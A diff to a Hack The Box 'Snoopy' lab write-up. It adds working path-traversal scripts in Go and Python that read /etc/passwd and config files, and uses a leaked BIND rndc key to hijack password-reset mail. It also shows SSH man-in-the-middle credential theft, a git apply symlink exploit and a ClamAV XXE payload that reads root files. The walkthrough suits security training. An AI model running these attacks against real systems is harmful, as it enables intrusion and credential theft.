@@ -112,9 +112,415 @@ snoopy.htb.             86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 
 ;; WHEN: Fri Jul 21 22:52:05 IST 2023
 ;; XFR size: 11 records (messages 1, bytes 325)
 ```
+
+## Arbitrary file read
+
+Found this on the internet
+```go
+package main
+
+import (
+        "archive/zip"
+        "fmt"
+        "io"
+        "net/http"
+        "net/url"
+        "os"
+)
+
+func checkError(err error) {
+        if err != nil {
+                return
+        }
+}
+
+func main() {
+        var URL string = "http://snoopy.htb"
+        var Resource string = "/download"
+        params := url.Values{}
+
+        var Payload string
+        fmt.Printf("Enter file location: ")
+        fmt.Scanf("%v", &Payload)
+
+        params.Add("file", fmt.Sprintf("....//....//....//....//....//....//....//....//....//....//....//..../%v", Payload))
+
+        buildUrl, _ := url.Parse(URL)
+        buildUrl.Path = Resource
+        buildUrl.RawQuery = params.Encode()
+
+        urlStr := fmt.Sprintf("%v", buildUrl)
+
+        res, err := http.Get(urlStr)
+        checkError(err)
+
+        defer res.Body.Close()
+        body, err := io.ReadAll(res.Body)
+
+        if err := os.WriteFile("test.zip", body, 0644); err != nil {
+                return
+        }
+
+        unzipData, err := zip.OpenReader("test.zip")
+        checkError(err)
+        defer unzipData.Close()
+
+        for _, file := range unzipData.File {
+                optReader, err := file.Open()
+                checkError(err)
+                defer optReader.Close()
+
+                opt, err := io.ReadAll(optReader)
+                checkError(err)
+
+                fmt.Printf(string(opt))
+        }
+
+}
+```
+
+Trying to go throught the process manually, because of the scan we know that the download page for the press release is php, so, maybe we can try to see how it responds with different url params
 ```bash
-go run main.go
-Enter file location: /etc/bind/named.conf
+curl -O 'http://10.10.11.212/download.php'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 10.8M  100 10.8M    0     0   982k      0  0:00:11  0:00:11 --:--:-- 2532k
+
+curl -O 'http://10.10.11.212/download.php?id=/etc/passwd'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 10.8M  100 10.8M    0     0  3579k      0  0:00:03  0:00:03 --:--:-- 3579k
+
+curl -O 'http://10.10.11.212/download.php?name=/etc/passwd'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 10.8M  100 10.8M    0     0  2869k      0  0:00:03  0:00:03 --:--:-- 2868k
+
+curl -O 'http://10.10.11.212/download.php?file=/etc/passwd'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+```
+
+If provided with an incorrect param it will not just return the same as when not provided with a param, that's the press release package. But when provided with the `file` param we get a different response, the response is empty though, so, maybe the logic triggered here is doing some basic LFI protection. If we just do the basic evasion from the aforementionned go code we should get data.
+```bash
+curl -O 'http://10.10.11.212/download.php?file=....//....//....//....//....//etc/passwd'
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   796  100   796    0     0  10947      0 --:--:-- --:--:-- --:--:-- 11055
+```
+
+```bash
+unzip download.php
+Archive:  download.php
+  inflating: press_package/etc/passwd
+```
+
+```bash
+tree .
+.
+├── download.php
+└── press_package
+    └── etc
+        └── passwd
+
+3 directories, 2 files
+```
+
+Let try to script that out ourselves in python
+```bash
+import requests
+import zipfile
+import click
+import io
+
+
+def get_archive(target: str) -> bytes:
+    path = f"....//....//....//....//..../{target}"
+    param = f"file={path}"
+    url = f"http://snoopy.htb/download.php?{param}"
+    res = requests.get(url)
+    return res.content
+
+
+def decompress_archive(data: bytes) -> str:
+    with io.BytesIO() as buf:
+        buf.write(data)
+        buf.seek(0)
+        with zipfile.ZipFile(buf, mode="r") as archive:
+            filename = archive.namelist()[0]
+            file = archive.read(filename)
+    return file.decode()
+
+
+@click.command()
+@click.option('--file', '-f', help='File to fetch')
+def main(file: str) -> None:
+    archive = get_archive(file)
+    file = decompress_archive(archive)
+    click.echo(file)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+```bash
+python3 read.py -f /etc/passwd|grep sh$
+root:x:0:0:root:/root:/bin/bash
+cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
+sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
+lpelt:x:1003:1004::/home/lpelt:/bin/bash
+cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
+vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
+```
+
+```bash
+python3 read.py -f /etc/nginx/nginx.conf
+user www-data;
+worker_processes auto;
+pid /run/nginx.pid;
+include /etc/nginx/modules-enabled/*.conf;
+
+events {
+    worker_connections 768;
+    # multi_accept on;
+}
+
+http {
+
+    ##
+    # Basic Settings
+    ##
+
+    sendfile on;
+    tcp_nopush on;
+    types_hash_max_size 2048;
+    # server_tokens off;
+
+    # server_names_hash_bucket_size 64;
+    # server_name_in_redirect off;
+
+    include /etc/nginx/mime.types;
+    default_type application/octet-stream;
+
+    ##
+    # SSL Settings
+    ##
+
+    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
+    ssl_prefer_server_ciphers on;
+
+    ##
+    # Logging Settings
+    ##
+
+    access_log /var/log/nginx/access.log;
+    error_log /var/log/nginx/error.log;
+
+    ##
+    # Gzip Settings
+    ##
+
+    gzip on;
+
+    # gzip_vary on;
+    # gzip_proxied any;
+    # gzip_comp_level 6;
+    # gzip_buffers 16 8k;
+    # gzip_http_version 1.1;
+    # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
+
+    ##
+    # Virtual Host Configs
+    ##
+
+    include /etc/nginx/conf.d/*.conf;
+    include /etc/nginx/sites-enabled/*;
+}
+
+
+#mail {
+#   # See sample authentication script at:
+#   # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
+#
+#   # auth_http localhost/auth.php;
+#   # pop3_capabilities "TOP" "USER";
+#   # imap_capabilities "IMAP4rev1" "UIDPLUS";
+#
+#   server {
+#       listen     localhost:110;
+#       protocol   pop3;
+#       proxy      on;
+#   }
+#
+#   server {
+#       listen     localhost:143;
+#       protocol   imap;
+#       proxy      on;
+#   }
+#}
+```
+
+```bash
+read.py -f /etc/nginx/sites-enabled/default
+##
+# You should look at the following URL's in order to grasp a solid understanding
+# of Nginx configuration files in order to fully unleash the power of Nginx.
+# https://www.nginx.com/resources/wiki/start/
+# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
+# https://wiki.debian.org/Nginx/DirectoryStructure
+#
+# In most cases, administrators will remove this file from sites-enabled/ and
+# leave it as reference inside of sites-available where it will continue to be
+# updated by the nginx packaging team.
+#
+# This file will automatically load configuration files provided by other
+# applications, such as Drupal or Wordpress. These applications will be made
+# available underneath a path with that package name, such as /drupal8.
+#
+# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
+##
+
+# Default server configuration
+#
+server {
+        listen 80 default_server;
+        listen [::]:80 default_server;
+
+        # SSL configuration
+        #
+        # listen 443 ssl default_server;
+        # listen [::]:443 ssl default_server;
+        #
+        # Note: You should disable gzip for SSL traffic.
+        # See: https://bugs.debian.org/773332
+        #
+        # Read up on ssl_ciphers to ensure a secure configuration.
+        # See: https://bugs.debian.org/765782
+        #
+        # Self signed certs generated by the ssl-cert package
+        # Don't use them in a production server!
+        #
+        # include snippets/snakeoil.conf;
+
+        root /var/www/html;
+
+        # Add index.php to the list if you are using PHP
+        index index.html index.htm index.nginx-debian.html;
+
+        server_name _;
+
+        location / {
+                # First attempt to serve request as file, then
+                # as directory, then fall back to displaying a 404.
+                try_files $uri $uri/ =404;
+        }
+
+        location ~ ^/download$ {
+                alias /var/www/html/download.php;
+                fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
+                fastcgi_param SCRIPT_FILENAME $request_filename;
+                include fastcgi_params;
+        }
+
+        location ~ \.php$ {
+                include fastcgi_params;
+                fastcgi_pass unix:/run/php/php8.1-fpm.sock;
+                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+        }
+
+        # pass PHP scripts to FastCGI server
+        #
+        #location ~ \.php$ {
+        #       include snippets/fastcgi-php.conf;
+        #
+        #       # With php-fpm (or other unix sockets):
+        #       fastcgi_pass unix:/run/php/php7.4-fpm.sock;
+        #       # With php-cgi (or other tcp sockets):
+        #       fastcgi_pass 127.0.0.1:9000;
+        #}
+
+        # deny access to .htaccess files, if Apache's document root
+        # concurs with nginx's one
+        #
+        #location ~ /\.ht {
+        #       deny all;
+        #}
+}
+
+
+# Virtual Host configuration for example.com
+#
+# You can move that to a different file under sites-available/ and symlink that
+# to sites-enabled/ to enable it.
+#
+#server {
+#       listen 80;
+#       listen [::]:80;
+#
+#       server_name example.com;
+#
+#       root /var/www/example.com;
+#       index index.html;
+#
+#       location / {
+#               try_files $uri $uri/ =404;
+#       }
+#}
+```
+
+This is what we just exploited
+```bash
+python3 read.py -f /var/www/html/download.php
+```
+```php
+<?php
+
+$file = $_GET['file'];
+$dir = 'press_package/';
+$archive = tempnam(sys_get_temp_dir(), 'archive');
+$zip = new ZipArchive();
+$zip->open($archive, ZipArchive::CREATE);
+
+if (isset($file)) {
+        $content = preg_replace('/\.\.\//', '', $file);
+        $filecontent = $dir . $content;
+        if (file_exists($filecontent)) {
+            if ($filecontent !== '.' && $filecontent !== '..') {
+                $content = preg_replace('/\.\.\//', '', $filecontent);
+                $zip->addFile($filecontent, $content);
+            }
+        }
+} else {
+        $files = scandir($dir);
+        foreach ($files as $file) {
+                if ($file !== '.' && $file !== '..') {
+                        $zip->addFile($dir . '/' . $file, $file);
+                }
+        }
+}
+
+$zip->close();
+header('Content-Type: application/zip');
+header("Content-Disposition: attachment; filename=press_release.zip");
+header('Content-Length: ' . filesize($archive));
+
+readfile($archive);
+unlink($archive);
+
+?>
+```
+
+Persumably the dns server is bind.
+```bash
+dig +short version.bind CHAOS TXT @10.10.11.212
+"9.18.12-0ubuntu0.22.04.1-Ubuntu"
+```
+
+So the configuration file for it should be here:
+```bash
+python3 read.py -f /etc/bind/named.conf
 // This is the primary configuration file for the BIND DNS server named.
 //
 // Please read /usr/share/doc/bind9/README.Debian.gz for information on the
@@ -129,9 +535,15 @@ include "/etc/bind/named.conf.default-zones";
 
 key "rndc-key" {
     algorithm hmac-sha256;
-    secret "BEqUtc**************************************";
+    secret "BEqUtce*************************************";
 };
 ```
+
+
+## Exploiting Bind DNS
+
+Because we have the hmac sha, we can authenticate to the DNS server to make DNS record changes.  
+And we have access to the password reset page in the mattermost instance, which sends password reset erequests to users emails, so, we can highjack the mail server address, and reset people's passwords
 ```bash
 cat commands
 server 10.10.11.212 53
@@ -190,6 +602,13 @@ removed the 3d and the =
 http://mm.snoopy.htb/reset_password_complete?token=7919jpuw858nosbwznddtjkyeg99zwkg4pxqpw9ybtpjxkf6cuqmkq7gdia77kdx
 ```
 
+
+
+## SSH MITM
+
+Looking through the chats on the mattermost instance, there is this `server_provision` slash command available, which will trigger a connection to the server with a user's credentials, and we control the address of the server, so same concept as before, we can just man in the middle that to steal the password.
+
+![provision.png](provision.png)  
 ```bash
 ssh-mitm server --remote-host snoopy.htb --listen-port 2222
 ───────────────────────────────── SSH-MITM - ssh audits made simple ─────────────────────────────────
@@ -238,6 +657,9 @@ listen interfaces 0.0.0.0 and :: on port 2222
 cbrown@snoopy:~$ id
 uid=1000(cbrown) gid=1000(cbrown) groups=1000(cbrown),1002(devops)
 ```
+
+## Lateral movement through git apply (CVE-2023-23946)
+
 ```bash
 cbrown@snoopy:~$ sudo -l
 [sudo] password for cbrown:
@@ -250,6 +672,11 @@ Matching Defaults entries for cbrown on snoopy:
 User cbrown may run the following commands on snoopy:
     (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
 ```
+
+Git allows for applying arbitrary patches to your repository’s history with git apply. In order to prevent malicious patches from creating files outside of the working copy, git apply rejects patches which attempt to write a file beyond a symbolic link.
+
+However, this mechanism can be tricked when the malicious patch creates that symbolic link in the first place. This can be leveraged to write arbitrary files on a victim’s filesystem when applying malicious patches from untrusted sources.
+
 ```bash
 cbrown@snoopy:~/repo$ find / -user sbrown 2>/dev/null
 /home/sbrown
@@ -273,8 +700,131 @@ Checking patch mio2/authorized_keys...
 Applied patch mio2/authorized_keys cleanly.
 ```
 
+And we we are now sbrown
 ```bash
+cbrown@snoopy:~$ ssh sbrown@127.0.0.1
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat Aug 12 11:57:14 2023 from 127.0.0.1
+sbrown@snoopy:~$ id
+uid=1001(sbrown) gid=1001(sbrown) groups=1001(sbrown),1002(devops)
 ```
+
+## ClamAV file disclosure
+
+```bash
+sbrown@snoopy:~$ sudo -l
+Matching Defaults entries for sbrown on snoopy:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
+    XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User sbrown may run the following commands on snoopy:
+    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
+```
+[https://docs.clamav.net/manual/Signatures/ExtendedSignatures.html](https://docs.clamav.net/manual/Signatures/ExtendedSignatures.html)  
+
+I went on a rabbit hole trying to match private keys with custom clamav rules using extended signatures as descibed in the documentation above
+```bash
+printf '-----BEGIN OPENSSH PRIVATE KEY-----'|xxd
+00000000: 2d2d 2d2d 2d42 4547 494e 204f 5045 4e53  -----BEGIN OPENS
+00000010: 5348 2050 5249 5641 5445 204b 4559 2d2d  SH PRIVATE KEY--
+00000020: 2d2d 2d                                  ---
+```
+
+Testing this on my own machine
+```bash
+pwd
+/var/lib/clamav
+```
+```bash
+cat priv.ndb
+PRIV:0:*:2d2d2d2d2d424547494e204f50454e5353482050524956415445204b45592d2d2d2d2d
+```
+```bash
+clamscan ~/.ssh
+Loading:     9s, ETA:   0s [========================>]    8.67M/8.67M sigs
+Compiling:   2s, ETA:   0s [========================>]       41/41 tasks
+
+/home/blnkn/.ssh/amd64: PRIV.UNOFFICIAL FOUND
+/home/blnkn/.ssh/ldapreferer.pem: OK
+/home/blnkn/.ssh/kvm.pub: OK
+/home/blnkn/.ssh/key.pub: OK
+/home/blnkn/.ssh/amd64.pem: PRIV.UNOFFICIAL FOUND
+/home/blnkn/.ssh/id_rsa: PRIV.UNOFFICIAL FOUND
+/home/blnkn/.ssh/key: PRIV.UNOFFICIAL FOUND
+/home/blnkn/.ssh/kvm: PRIV.UNOFFICIAL FOUND
+/home/blnkn/.ssh/known_hosts: OK
+/home/blnkn/.ssh/do: PRIV.UNOFFICIAL FOUND
+/home/blnkn/.ssh/1xA10.pem: OK
+/home/blnkn/.ssh/open-vpn-london.pem: PRIV.UNOFFICIAL FOUND
+/home/blnkn/.ssh/known_hosts.old: OK
+/home/blnkn/.ssh/authorized_keys: OK
+/home/blnkn/.ssh/id_rsa.pub: OK
+/home/blnkn/.ssh/squid-proxy-london.pem: PRIV.UNOFFICIAL FOUND
+/home/blnkn/.ssh/priv.ndb: OK
+
+----------- SCAN SUMMARY -----------
+Known viruses: 8671731
+Engine version: 1.0.1
+Scanned directories: 1
+Scanned files: 17
+Infected files: 8
+Data scanned: 0.05 MB
+Data read: 0.02 MB (ratio 2.00:1)
+Time: 11.218 sec (0 m 11 s)
+Start Date: 2023:08:12 14:55:28
+End Date:   2023:08:12 14:55:40
+```
+
+It works, but we don't have really have a way to leverage that on the remote machine because of the strict regex on the sudo command. We could probably successfully match the file by using a symlink on the path we control to `/root/id_rsa` but again, because of the strict regex validation, we can't leverage that to copy the infected files over with the `--copy` flag... Back to the drawing board
 ```bash
 ```
 
+[CVE-2023-20052](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-clamav-xxe-TcSZduhN) affects clamav =< 1.0.0
+```bash
+clamscan --version
+ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
+```
+Found a PoC for it:  
+[https://github.com/nokn0wthing/CVE-2023-20052](https://github.com/nokn0wthing/CVE-2023-20052)  
+```bash
+docker run -v $(pwd):/exploit -it cve-2023-20052 bash
+```
+```bash
+root@f6cb73afbeb4:/exploit# genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
+bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/root.txt"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg
+genisoimage: Warning: no Apple/Unix files will be decoded/mapped
+Total translation table size: 0
+Total rockridge attributes bytes: 7069
+Total directory bytes: 38180
+Path table size(bytes): 240
+Max brk space used 23000
+362 extents written (0 MB)
+Processing DDM...
+No DDM! Just doing one huge blkx then...
+run 0: sectors=512, left=1448
+run 1: sectors=512, left=936
+run 2: sectors=424, left=424
+Writing XML data...
+Generating UDIF metadata...
+Master checksum: a1ba5595
+Writing out UDIF resource file...
+Cleaning up...
+Done
+```
+
+Moving the .dmg over to the scan folder in the box and running clamscan, the XXE is triggered successfully and we can read files as root
+```bash
+LibClamAV debug: cli_scandmg: wanted blkx, text value is 9b94****************************
+```
